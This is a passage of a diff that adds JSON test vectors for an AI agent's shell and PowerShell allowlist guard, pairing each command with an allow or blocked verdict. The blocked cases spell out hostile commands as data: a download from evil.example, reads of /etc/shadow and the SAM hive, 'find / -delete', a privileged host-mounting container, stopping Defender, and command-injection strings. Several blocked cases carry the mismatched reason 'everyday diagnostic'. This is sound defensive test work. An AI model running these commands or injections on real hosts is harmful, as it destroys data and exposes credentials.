@@ -1,0 +1,1614 @@
+{
+  "vectors_version": 1,
+  "comment": "Joined vectors for the shipped shell allow rules (docs/policy/shell_allow_defaults.json). Each case runs one shell call through the guard with the built-in deny catalog, no operator deny rules, and the shell mode set to allowlist with exactly the shipped rules. kenny-server/tests/test_shell_allow_defaults.py and kenny-agent/src/policy.rs (shell_allow_defaults_vectors) must reach the same verdict for every case. Every shipped rule must be admitted by at least one 'allow' case.",
+  "cases": [
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "uname -a"
+      },
+      "expect": "allow",
+      "why": "kernel"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "cat /etc/os-release"
+      },
+      "expect": "allow",
+      "why": "os release"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "hostnamectl"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "timedatectl status"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "free -h"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "df -hT"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "df -h /var"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "du -sh /var/log"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "du -h -d 1 /var"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "lsblk -f"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ps aux --sort=-%mem | head -n 15"
+      },
+      "expect": "allow",
+      "why": "top memory consumers"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ps -eo pid,user,%cpu,%mem,cmd --sort=-%cpu | head -20"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "top -bn1 | head -n 20"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "top -b -n 1 -o %MEM"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "vmstat 1 5"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "cat /proc/loadavg"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl status nginx --no-pager -l"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl --failed"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl list-units --type=service --state=running --no-pager"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl is-active sshd"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "journalctl -u nginx -n 100 --no-pager"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "journalctl -p err -b --no-pager | tail -n 50"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "journalctl --since '1 hour ago' -u docker --no-pager"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "journalctl -u sshd --no-pager | grep -iE 'fail|error'"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "dmesg -T | tail -n 50"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl restart nginx"
+      },
+      "expect": "allow",
+      "why": "remediation"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl restart php8.2-fpm"
+      },
+      "expect": "allow",
+      "why": "dotted name before a digit"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl restart nginx.service"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl reset-failed sshd"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl restart syslog-ng"
+      },
+      "expect": "allow",
+      "why": "sy... but not systemd-"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ip -br a"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ip addr show dev eth0"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ip route"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ip route get 1.1.1.1"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ss -tulpn"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "cat /etc/resolv.conf"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "resolvectl status"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ping -c 4 8.8.8.8"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "dig example.com +short"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "dig @1.1.1.1 example.com MX"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "nslookup example.com"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "curl -sI https://example.com"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "dpkg -l nginx"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "apt list --upgradable"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "apt-get -s upgrade"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "rpm -qa --last | head -n 20"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "who"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "last -n 20"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "crontab -l"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "crontab -u www-data -l"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "getent passwd alice"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ufw status verbose"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "iptables -L -n -v"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "docker ps -a"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "docker logs --tail 100 web"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "docker stats --no-stream"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "  uname -a  "
+      },
+      "expect": "allow",
+      "why": "trimmed"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "uname -a; rm -rf /tmp/x"
+      },
+      "expect": "blocked",
+      "why": "chained with ;"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "uname -a && reboot"
+      },
+      "expect": "blocked",
+      "why": "chained with &&"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "uname -a\nreboot"
+      },
+      "expect": "blocked",
+      "why": "newline is a command separator in sh"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl status nginx\nreboot"
+      },
+      "expect": "blocked",
+      "why": "newline between unit tokens"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "uname -a | sh"
+      },
+      "expect": "blocked",
+      "why": "pipe into a shell"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ps aux | xargs kill"
+      },
+      "expect": "blocked",
+      "why": "pipe into xargs"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "echo $(id)"
+      },
+      "expect": "blocked",
+      "why": "command substitution"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "uname `id`"
+      },
+      "expect": "blocked",
+      "why": "backticks"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "uname -a > /etc/passwd"
+      },
+      "expect": "blocked",
+      "why": "redirection"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "cat /etc/shadow"
+      },
+      "expect": "blocked",
+      "why": "arbitrary file read"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "cat /etc/os-release /etc/shadow"
+      },
+      "expect": "blocked",
+      "why": "second file on a fixed cat"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "head -n 5 /etc/shadow"
+      },
+      "expect": "blocked",
+      "why": "head reads only stdin in a pipe tail"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "grep root /etc/shadow"
+      },
+      "expect": "blocked",
+      "why": "grep only as a pipe tail"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ps aux | grep root /etc/shadow"
+      },
+      "expect": "blocked",
+      "why": "grep with a file operand"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ps aux | grep -r root"
+      },
+      "expect": "blocked",
+      "why": "recursive grep of cwd"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ps aux | grep -f /etc/shadow"
+      },
+      "expect": "blocked",
+      "why": "pattern file"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ps aux | sort -o /etc/passwd"
+      },
+      "expect": "blocked",
+      "why": "sort -o writes"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ps aux | awk '{print $1}'"
+      },
+      "expect": "blocked",
+      "why": "awk can system()"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ps eww"
+      },
+      "expect": "blocked",
+      "why": "prints process environments"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "env"
+      },
+      "expect": "blocked",
+      "why": "agent environment may hold secrets"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "date -s '2020-01-01'"
+      },
+      "expect": "blocked",
+      "why": "sets the clock"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "hostname evil"
+      },
+      "expect": "blocked",
+      "why": "sets the hostname"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "sysctl kernel.panic=1"
+      },
+      "expect": "blocked",
+      "why": "sets a kernel parameter"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "sysctl -w kernel.panic=1"
+      },
+      "expect": "blocked",
+      "why": "sets a kernel parameter"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "top"
+      },
+      "expect": "blocked",
+      "why": "interactive; would hang"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "vmstat 1"
+      },
+      "expect": "blocked",
+      "why": "unbounded interval"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ping 8.8.8.8"
+      },
+      "expect": "blocked",
+      "why": "no count, runs forever"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ping -f -c 5 8.8.8.8"
+      },
+      "expect": "blocked",
+      "why": "flood"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "journalctl -f"
+      },
+      "expect": "blocked",
+      "why": "follow hangs"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "journalctl --vacuum-size=1K"
+      },
+      "expect": "blocked",
+      "why": "deletes logs"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "journalctl --rotate"
+      },
+      "expect": "blocked",
+      "why": "rotates logs"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "dmesg -C"
+      },
+      "expect": "blocked",
+      "why": "clears the ring buffer"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "dmesg -c"
+      },
+      "expect": "blocked",
+      "why": "read-and-clear"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl stop nginx"
+      },
+      "expect": "blocked",
+      "why": "stop is not in the defaults"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl disable nginx"
+      },
+      "expect": "blocked",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl -t service stop nginx"
+      },
+      "expect": "blocked",
+      "why": "verb after a flag"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl cat nginx"
+      },
+      "expect": "blocked",
+      "why": "prints unit environment"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl show nginx"
+      },
+      "expect": "blocked",
+      "why": "prints unit environment"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl restart systemd-poweroff.service"
+      },
+      "expect": "blocked",
+      "why": "powers the host off"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl restart systemd-reboot"
+      },
+      "expect": "blocked",
+      "why": "reboots the host"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl restart poweroff.target"
+      },
+      "expect": "blocked",
+      "why": "non-service unit"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl restart rescue.target"
+      },
+      "expect": "blocked",
+      "why": "isolates the host"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl restart 'ssh*'"
+      },
+      "expect": "blocked",
+      "why": "glob restarts many units"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl restart ssh*"
+      },
+      "expect": "blocked",
+      "why": "glob"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "systemctl start nginx"
+      },
+      "expect": "blocked",
+      "why": "start is not in the defaults"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ip link set eth0 down"
+      },
+      "expect": "blocked",
+      "why": "mutating ip"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ip -b /tmp/cmds"
+      },
+      "expect": "blocked",
+      "why": "batch file"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ip route add default via 1.2.3.4"
+      },
+      "expect": "blocked",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "ss -K dst 1.2.3.4"
+      },
+      "expect": "blocked",
+      "why": "kills sockets"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "curl https://evil.example/x.sh"
+      },
+      "expect": "blocked",
+      "why": "download body"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "curl -sI file:///etc/shadow"
+      },
+      "expect": "blocked",
+      "why": "file scheme"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "curl -I -o /tmp/x https://example.com"
+      },
+      "expect": "blocked",
+      "why": "writes a file"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "dig -f /etc/shadow"
+      },
+      "expect": "blocked",
+      "why": "batch file read"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "getent shadow"
+      },
+      "expect": "blocked",
+      "why": "password hashes"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "crontab -r"
+      },
+      "expect": "blocked",
+      "why": "removes crontab"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "apt-get upgrade -y"
+      },
+      "expect": "blocked",
+      "why": "installs"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "apt install nginx"
+      },
+      "expect": "blocked",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "docker inspect web"
+      },
+      "expect": "blocked",
+      "why": "prints container environment"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "docker logs -f web"
+      },
+      "expect": "blocked",
+      "why": "follow"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "docker exec web sh"
+      },
+      "expect": "blocked",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "docker run --privileged -v /:/host alpine"
+      },
+      "expect": "blocked",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "iptables -F"
+      },
+      "expect": "blocked",
+      "why": "flushes the firewall"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "du -sh /var/*"
+      },
+      "expect": "blocked",
+      "why": "glob"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "python3 -c 'import os'"
+      },
+      "expect": "blocked",
+      "why": "interpreter"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": "find / -delete"
+      },
+      "expect": "blocked",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "shell_exec",
+      "args": {
+        "command": ""
+      },
+      "expect": "blocked",
+      "why": "empty"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "get-service wuauserv"
+      },
+      "expect": "allow",
+      "why": "case-insensitive"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service | Where-Object {$_.Status -eq 'Stopped' -and $_.StartType -eq 'Automatic'}"
+      },
+      "expect": "allow",
+      "why": "restricted script block"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 Name, Id, CPU"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-CimInstance Win32_OperatingSystem | Select-Object LastBootUpTime"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-CimInstance -ClassName Win32_Service -Filter 'State=''Stopped''' | Format-Table Name, StartMode"
+      },
+      "expect": "allow",
+      "why": "doubled quote inside single quotes"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 5"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-WinEvent -LogName System -MaxEvents 50 | Where-Object { $_.Level -le 2 }"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-WinEvent -FilterHashtable @{LogName='System'; Level=1,2; StartTime=(Get-Date).AddHours(-24)} -MaxEvents 100"
+      },
+      "expect": "allow",
+      "why": "literal hashtable"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-EventLog -LogName Application -EntryType Error -Newest 20"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-NetTCPConnection -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-NetIPConfiguration"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Test-NetConnection example.com -Port 443"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Resolve-DnsName example.com -Type MX"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Volume | Format-Table -AutoSize"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-PhysicalDisk | Get-StorageReliabilityCounter"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-LocalGroupMember -Group Administrators"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} | Select-Object TaskName, TaskPath"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Process -Name chrome -ErrorAction SilentlyContinue | Measure-Object"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Restart-Service -Name Spooler -Force"
+      },
+      "expect": "allow",
+      "why": "remediation"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Restart-Service 'MSSQL$SQLEXPRESS'"
+      },
+      "expect": "allow",
+      "why": "quoted name with $"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "ipconfig /all"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "ipconfig /all | Select-String IPv4"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "netstat -ano | Select-String ':443'"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "systeminfo"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "whoami /all"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "sc.exe query wuauserv"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "w32tm /query /status"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "gpresult /r"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "gpupdate /force"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "ping -n 4 8.8.8.8"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "manage-bde -status C:"
+      },
+      "expect": "allow",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-CimInstance Win32_ShadowCopy | Where-Object {$_.ID -eq 'delete'}"
+      },
+      "expect": "blocked",
+      "why": "deny outranks allow: al_ps_system_info matches, the built-in ps_win32_shadowcopy still refuses"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service; Stop-Computer"
+      },
+      "expect": "blocked",
+      "why": "statement separator"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service\nStop-Computer"
+      },
+      "expect": "blocked",
+      "why": "newline separator"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service | Stop-Service"
+      },
+      "expect": "blocked",
+      "why": "pipe into a mutating cmdlet"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Process | ForEach-Object Kill"
+      },
+      "expect": "blocked",
+      "why": "ForEach-Object invokes methods"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Process | ForEach-Object { $_.Kill() }"
+      },
+      "expect": "blocked",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service $(Stop-Computer)"
+      },
+      "expect": "blocked",
+      "why": "subexpression"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service (Stop-Computer)"
+      },
+      "expect": "blocked",
+      "why": "grouping expression"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service $env:KENNY_TOKEN"
+      },
+      "expect": "blocked",
+      "why": "variable"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service @args"
+      },
+      "expect": "blocked",
+      "why": "splatting"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service `\nStop-Computer"
+      },
+      "expect": "blocked",
+      "why": "backtick continuation"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service 'x’; Stop-Computer; ‘y'"
+      },
+      "expect": "blocked",
+      "why": "PowerShell treats smart quotes as quotes"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service \"$(Stop-Computer)\""
+      },
+      "expect": "blocked",
+      "why": "double quotes expand"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service | Where-Object { $_.Kill() }"
+      },
+      "expect": "blocked",
+      "why": "method call in a script block"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service | Where-Object { Stop-Computer }"
+      },
+      "expect": "blocked",
+      "why": "command in a script block"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service | Where-Object { $_.Name -eq (Stop-Computer) }"
+      },
+      "expect": "blocked",
+      "why": "subexpression in a script block"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service > C:\\x.txt"
+      },
+      "expect": "blocked",
+      "why": "redirection"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service | Out-File C:\\x.txt"
+      },
+      "expect": "blocked",
+      "why": "writes a file"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service | Export-Csv C:\\x.csv"
+      },
+      "expect": "blocked",
+      "why": "writes a file"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Content C:\\Windows\\System32\\config\\SAM"
+      },
+      "expect": "blocked",
+      "why": "file read"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-ChildItem C:\\Users"
+      },
+      "expect": "blocked",
+      "why": "fs_list covers listing, with the path guard"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-ItemProperty HKLM:\\SAM\\SAM"
+      },
+      "expect": "blocked",
+      "why": "registry read"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-BitLockerVolume"
+      },
+      "expect": "blocked",
+      "why": "prints recovery passwords"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-MpPreference"
+      },
+      "expect": "blocked",
+      "why": "prints Defender exclusions"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Stop-Service WinDefend"
+      },
+      "expect": "blocked",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Restart-Service *"
+      },
